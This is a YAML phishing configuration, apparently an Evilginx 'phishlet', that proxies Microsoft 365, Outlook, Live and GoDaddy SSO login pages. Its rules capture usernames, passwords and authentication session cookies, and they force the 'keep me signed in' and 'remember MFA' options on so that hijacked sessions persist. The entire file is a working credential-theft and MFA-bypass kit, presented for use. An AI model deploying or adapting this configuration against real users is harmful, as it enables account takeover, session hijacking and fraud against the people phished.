author: '@an0nud4y'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'live', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
  - {phish_sub: 'office365', orig_sub: 'outlook', domain: 'office365.com', session: true, is_landing: false}
  - {phish_sub: 'autologon', orig_sub: 'autologon', domain: 'microsoftazuread-sso.com', session: true, is_landing: false}
  - {phish_sub: 'mcasproxy', orig_sub: 'mcasproxy', domain: 'azureedge.net', session: true, is_landing: false}
  - {phish_sub: 'outlook-us', orig_sub: 'outlook', domain: 'office365.com.us3.cas.ms', session: true, is_landing: false}
  - {phish_sub: 'outlook-1', orig_sub: 'outlook-1', domain: 'cdn.office.net.us3.cas.ms', session: true, is_landing: false}
  - {phish_sub: 'login-us', orig_sub: 'login', domain: 'office365.com.us3.cas.ms', session: true, is_landing: false}
  - {phish_sub: 'browser', orig_sub: 'browser.pipe.aria', domain: 'microsoft.com.us3.cas.ms', session: true, is_landing: false}
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}

sub_filters:
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['esctx', 'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp']         
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT', 'x-ms-gateway-slice', 'SignInStateCookie', '.*,regexp']         
  - domain: 'outlook.office365.com'
    keys: ['DefaultAnchorMailbox', 'UC', 'OutlookSession', 'X-OWA-CANARY', '.*,regexp']  
  - domain: 'godaddy.com'
    keys: ['esctx', 'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp'] 

auth_urls:
  - '/'
  - '/mail/inbox'
  
    
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/' 
force_post:
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'

